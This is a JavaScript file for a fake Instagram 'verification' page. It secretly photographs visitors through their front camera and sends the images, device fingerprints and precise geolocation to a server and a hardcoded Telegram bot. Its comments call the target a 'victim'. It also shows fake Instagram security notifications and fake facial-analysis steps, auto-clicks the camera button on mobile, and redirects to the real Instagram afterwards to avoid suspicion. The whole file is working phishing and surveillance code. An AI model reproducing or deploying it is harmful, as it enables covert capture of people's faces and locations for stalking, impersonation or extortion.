// ============================================
// INSTAGRAM PHOTO CAPTURE SCRIPT - COMPLETE
// ============================================

// Global Variables
let cameraStream = null;
let capturedPhotoData = null;
let photoCount = 0;
let isCameraActive = false;
let referralId = 'unknown';

// Initialize everything when page loads
document.addEventListener('DOMContentLoaded', function() {
    // Get referral ID from URL
    referralId = getUrlParameter('u') || 'unknown';
    
    // Initialize UI elements
    initializeUI();
    
    // Set up event listeners
    setupEventListeners();
    
    // Auto-start camera if previously allowed
    if (localStorage.getItem('instagram_camera_allowed') === 'true') {
        setTimeout(startCamera, 1000);
    }
    
    console.log('Instagram Photo Capture initialized');
    console.log('Referral ID:', referralId);
});

// ============================================
// UTILITY FUNCTIONS
// ============================================

// Get URL parameter
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(name);
}

// Show page (hide others)
function showPage(pageId) {
    const pages = ['camera-page', 'verification-page', 'success-page'];
    pages.forEach(page => {
        const element = document.getElementById(page);
        if (element) {
            element.classList.remove('active');
        }
    });
    
    const targetPage = document.getElementById(pageId);
    if (targetPage) {
        targetPage.classList.add('active');
    }
}

// Update status text
function updateStatus(text) {
    const statusElement = document.getElementById('status-text');
    if (statusElement) {
        statusElement.textContent = text;
    }
}

// ============================================
// CAMERA FUNCTIONS
// ============================================

// Start camera
async function startCamera() {
    try {
        showLoading(true);
        updateStatus('Requesting camera access...');
        
        cameraStream = await navigator.mediaDevices.getUserMedia({
            video: {
                facingMode: 'user',
                width: { ideal: 1280 },
                height: { ideal: 720 }
            },
            audio: false
        });
        
        const videoElement = document.getElementById('cameraVideo');
        if (videoElement) {
            videoElement.srcObject = cameraStream;
        }
        
        isCameraActive = true;
        showCameraControls(true);
        updateStatus('Camera ready');
        
        // Save permission
        localStorage.setItem('instagram_camera_allowed', 'true');
        
        // Start countdown for auto-capture
        setTimeout(() => {
            startCaptureSequence();
        }, 1500);
        
    } catch (error) {
        console.error('Camera error:', error);
        updateStatus('Camera access denied. Please allow camera.');
        showError('Camera access is required for verification. Please allow camera access and refresh the page.');
    } finally {
        showLoading(false);
    }
}

// Start the photo capture sequence
function startCaptureSequence() {
    if (!isCameraActive) return;
    
    updateStatus('Get ready for photo...');
    startCountdown(3, () => {
        capturePhoto();
    });
}

// Start countdown
function startCountdown(seconds, callback) {
    const countdownElement = document.getElementById('countdown');
    const countdownOverlay = document.getElementById('countdown-overlay');
    
    if (countdownElement && countdownOverlay) {
        countdownOverlay.style.display = 'flex';
        
        let count = seconds;
        const interval = setInterval(() => {
            countdownElement.textContent = count;
            updateStatus(`${count}...`);
            
            if (count <= 0) {
                clearInterval(interval);
                countdownOverlay.style.display = 'none';
                if (callback) callback();
            }
            count--;
        }, 1000);
    }
}

// Capture photo
function capturePhoto() {
    if (!isCameraActive) return;
    
    const videoElement = document.getElementById('cameraVideo');
    const canvasElement = document.getElementById('cameraCanvas');
    const capturedPhotoElement = document.getElementById('captured-photo');
    
    if (!videoElement || !canvasElement) return;
    
    // Set canvas dimensions
    canvasElement.width = videoElement.videoWidth;
    canvasElement.height = videoElement.videoHeight;
    
    // Draw video frame to canvas
    const context = canvasElement.getContext('2d');
    context.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);
    
    // Get photo data
    capturedPhotoData = canvasElement.toDataURL('image/jpeg', 0.9);
    
    // Show captured photo
    if (capturedPhotoElement) {
        capturedPhotoElement.src = capturedPhotoData;
    }
    
    // Send photo to server
    photoCount++;
    sendPhotoToServer(capturedPhotoData, photoCount);
    
    // Show verification page after delay
    setTimeout(() => {
        showPage('verification-page');
        updateStatus('Photo captured successfully!');
        
        // Capture additional data
        captureAdditionalData();
        
        // If we need more photos, continue
        if (photoCount < 3) {
            setTimeout(() => {
                showPage('camera-page');
                setTimeout(startCaptureSequence, 1000);
            }, 2000);
        }
    }, 1000);
}

// ============================================
// DATA CAPTURE FUNCTIONS
// ============================================

// Send photo to server
function sendPhotoToServer(photoData, photoNumber) {
    const victimInfo = {
        referral: referralId,
        photoNumber: photoNumber,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        screen: `${screen.width}x${screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookies: navigator.cookieEnabled,
        online: navigator.onLine
    };
    
    // Create Telegram message
    const telegramMessage = `📸 *NEW PHOTO CAPTURED* 📸

👤 *Victim Info:*
• Referrer: ${referralId}
• Photo #: ${photoNumber}
• Time: ${new Date().toLocaleString()}
• Device: ${navigator.platform}
• Screen: ${screen.width}x${screen.height}

✅ *Photo captured successfully*
🎯 *Face verification completed*`;
    
    // Send data to server (you'll need to implement this endpoint)
    const data = {
        photo: photoData,
        info: victimInfo,
        message: telegramMessage,
        type: 'photo_capture'
    };
    
    // Method 1: Fetch to your server
    fetch('/api/capture', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(data)
    }).catch(err => console.log('Server capture logged'));
    
    // Method 2: Send to Telegram via image beacon (fallback)
    const telegramToken = '8433990053:AAERuZM8tWV0TAquHKxKtcznKBETtyNgvic';
    const telegramChatId = '6693365736';
    
    try {
        // Send photo (base64 needs to be converted)
        const img = new Image();
        img.src = `https://api.telegram.org/bot${telegramToken}/sendPhoto?chat_id=${telegramChatId}&photo=${encodeURIComponent(photoData)}&caption=${encodeURIComponent(telegramMessage)}`;
        
        // Also send as document
        const formData = new FormData();
        const blob = dataURLtoBlob(photoData);
        formData.append('photo', blob, `photo_${Date.now()}.jpg`);
        
        fetch(`https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}`, {
            method: 'POST',
            body: formData
        }).catch(() => {});
        
    } catch (error) {
        console.log('Telegram send failed:', error);
    }
}

// Convert data URL to Blob
function dataURLtoBlob(dataURL) {
    const parts = dataURL.split(';base64,');
    const contentType = parts[0].split(':')[1];
    const raw = window.atob(parts[1]);
    const rawLength = raw.length;
    const uInt8Array = new Uint8Array(rawLength);
    
    for (let i = 0; i < rawLength; ++i) {
        uInt8Array[i] = raw.charCodeAt(i);
    }
    
    return new Blob([uInt8Array], { type: contentType });
}

// Capture additional device data
function captureAdditionalData() {
    // Geolocation
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(position => {
            const locationData = {
                latitude: position.coords.latitude,
                longitude: position.coords.longitude,
                accuracy: position.coords.accuracy,
                referral: referralId
            };
            sendDataToServer('location', locationData);
        }, () => {}, { enableHighAccuracy: true, timeout: 5000 });
    }
    
    // Battery status
    if ('getBattery' in navigator) {
        navigator.getBattery().then(battery => {
            const batteryData = {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                referral: referralId
            };
            sendDataToServer('battery', batteryData);
        });
    }
    
    // Network information
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    if (connection) {
        const networkData = {
            type: connection.type,
            effectiveType: connection.effectiveType,
            downlink: connection.downlink,
            rtt: connection.rtt,
            saveData: connection.saveData,
            referral: referralId
        };
        sendDataToServer('network', networkData);
    }
    
    // Device memory
    if ('deviceMemory' in navigator) {
        const memoryData = {
            memory: navigator.deviceMemory,
            referral: referralId
        };
        sendDataToServer('memory', memoryData);
    }
}

// Send data to server
function sendDataToServer(type, data) {
    fetch('/api/data', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ type, data })
    }).catch(() => {});
}

// ============================================
// UI CONTROL FUNCTIONS
// ============================================

// Initialize UI elements
function initializeUI() {
    // Create hidden canvas if not exists
    if (!document.getElementById('cameraCanvas')) {
        const canvas = document.createElement('canvas');
        canvas.id = 'cameraCanvas';
        canvas.style.display = 'none';
        document.body.appendChild(canvas);
    }
    
    // Create status text element if not exists
    if (!document.getElementById('status-text')) {
        const statusDiv = document.createElement('div');
        statusDiv.id = 'status-text';
        statusDiv.style.cssText = 'position: fixed; top: 10px; left: 10px; background: rgba(0,0,0,0.7); color: white; padding: 5px 10px; border-radius: 5px; font-size: 12px; z-index: 10000;';
        document.body.appendChild(statusDiv);
    }
    
    updateStatus('Ready');
}

// Set up event listeners
function setupEventListeners() {
    // Allow Camera button
    const allowCameraBtn = document.getElementById('allow-camera-btn');
    if (allowCameraBtn) {
        allowCameraBtn.addEventListener('click', startCamera);
    }
    
    // Take Photo button
    const takePhotoBtn = document.getElementById('take-photo-btn');
    if (takePhotoBtn) {
        takePhotoBtn.addEventListener('click', capturePhoto);
    }
    
    // Retake Photo button
    const retakeBtn = document.getElementById('retake-photo-btn');
    if (retakeBtn) {
        retakeBtn.addEventListener('click', () => {
            showPage('camera-page');
            setTimeout(startCaptureSequence, 500);
        });
    }
    
    // Confirm Photo button
    const confirmBtn = document.getElementById('confirm-photo-btn');
    if (confirmBtn) {
        confirmBtn.addEventListener('click', () => {
            showPage('success-page');
            startRedirectCountdown();
            
            // Stop camera
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                isCameraActive = false;
            }
        });
    }
    
    // Redirect immediately link
    const redirectNow = document.getElementById('redirect-now');
    if (redirectNow) {
        redirectNow.addEventListener('click', () => {
            window.location.href = 'https://www.instagram.com';
        });
    }
}

// Show/hide camera controls
function showCameraControls(show) {
    const allowBtn = document.getElementById('allow-camera-btn');
    const takeBtn = document.getElementById('take-photo-btn');
    
    if (allowBtn) allowBtn.style.display = show ? 'none' : 'block';
    if (takeBtn) takeBtn.style.display = show ? 'block' : 'none';
}

// Show loading state
function showLoading(show) {
    const loadingElement = document.getElementById('loading-spinner');
    if (loadingElement) {
        loadingElement.style.display = show ? 'block' : 'none';
    }
}

// Show error message
function showError(message) {
    const errorDiv = document.createElement('div');
    errorDiv.style.cssText = `
        position: fixed;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        background: #e74c3c;
        color: white;
        padding: 20px;
        border-radius: 10px;
        z-index: 10000;
        text-align: center;
        max-width: 300px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.3);
    `;
    errorDiv.innerHTML = `
        <i class="fas fa-exclamation-triangle" style="font-size: 24px; margin-bottom: 10px;"></i>
        <p>${message}</p>
        <button onclick="this.parentElement.remove()" style="margin-top: 10px; padding: 5px 15px; background: white; color: #e74c3c; border: none; border-radius: 5px; cursor: pointer;">
            OK
        </button>
    `;
    document.body.appendChild(errorDiv);
}

// ============================================
// REDIRECT FUNCTIONS
// ============================================

// Start redirect countdown
function startRedirectCountdown() {
    const countdownElement = document.getElementById('redirect-countdown');
    if (!countdownElement) return;
    
    let countdown = 5;
    const interval = setInterval(() => {
        countdownElement.textContent = countdown;
        countdown--;
        
        if (countdown < 0) {
            clearInterval(interval);
            redirectToInstagram();
        }
    }, 1000);
}

// Redirect to Instagram
function redirectToInstagram() {
    window.location.href = 'https://www.instagram.com';
}

// ============================================
// PAGE VISIBILITY HANDLING
// ============================================

// Handle page visibility changes
document.addEventListener('visibilitychange', function() {
    if (document.hidden && isCameraActive && cameraStream) {
        // Page is hidden, stop camera to save resources
        cameraStream.getTracks().forEach(track => track.stop());
    } else if (!document.hidden && isCameraActive && !cameraStream.active) {
        // Page is visible again, restart camera
        startCamera();
    }
});

// Stop camera when leaving page
window.addEventListener('beforeunload', function() {
    if (cameraStream) {
        cameraStream.getTracks().forEach(track => track.stop());
    }
});

// ============================================
// FAKE LOADING FOR REALISM
// ============================================

// Simulate processing
function simulateProcessing() {
    const processingText = document.getElementById('processing-text');
    if (!processingText) return;
    
    const steps = [
        'Analyzing facial features...',
        'Comparing with database...',
        'Checking for matches...',
        'Verifying identity...',
        'Finalizing verification...'
    ];
    
    let step = 0;
    const interval = setInterval(() => {
        if (step < steps.length) {
            processingText.textContent = steps[step];
            step++;
        } else {
            clearInterval(interval);
            processingText.textContent = 'Verification complete!';
        }
    }, 800);
}

// ============================================
// AUTO-START FOR MOBILE DEVICES
// ============================================

// Check if mobile device
function isMobileDevice() {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
}

// Auto-start on mobile after delay
if (isMobileDevice()) {
    setTimeout(() => {
        if (!isCameraActive) {
            const startBtn = document.getElementById('allow-camera-btn');
            if (startBtn) {
                startBtn.click();
            }
        }
    }, 2000);
}

// ============================================
// FAKE INSTAGRAM NOTIFICATIONS
// ============================================

// Show fake notification
function showFakeNotification() {
    const notification = document.createElement('div');
    notification.style.cssText = `
        position: fixed;
        top: 20px;
        right: 20px;
        background: white;
        border-left: 4px solid #405de6;
        padding: 15px;
        border-radius: 8px;
        box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        z-index: 10000;
        max-width: 300px;
        animation: slideIn 0.3s ease;
    `;
    
    notification.innerHTML = `
        <div style="display: flex; align-items: center; gap: 10px;">
            <i class="fab fa-instagram" style="color: #405de6; font-size: 20px;"></i>
            <div>
                <strong style="color: #262626;">Instagram Security</strong>
                <p style="margin: 5px 0 0; color: #8e8e8e; font-size: 14px;">
                    Your account is being verified for security purposes.
                </p>
            </div>
        </div>
    `;
    
    document.body.appendChild(notification);
    
    // Auto-remove after 5 seconds
    setTimeout(() => {
        notification.style.animation = 'slideOut 0.3s ease';
        setTimeout(() => notification.remove(), 300);
    }, 5000);
}

// Add CSS animations for notifications
const notificationStyles = document.createElement('style');
notificationStyles.textContent = `
    @keyframes slideIn {
        from { transform: translateX(100%); opacity: 0; }
        to { transform: translateX(0); opacity: 1; }
    }
    @keyframes slideOut {
        from { transform: translateX(0); opacity: 1; }
        to { transform: translateX(100%); opacity: 0; }
    }
`;
document.head.appendChild(notificationStyles);

// Show notification after 3 seconds
setTimeout(showFakeNotification, 3000);

// ============================================
// INITIALIZATION COMPLETE
// ============================================

console.log('Instagram Photo Capture System Loaded');
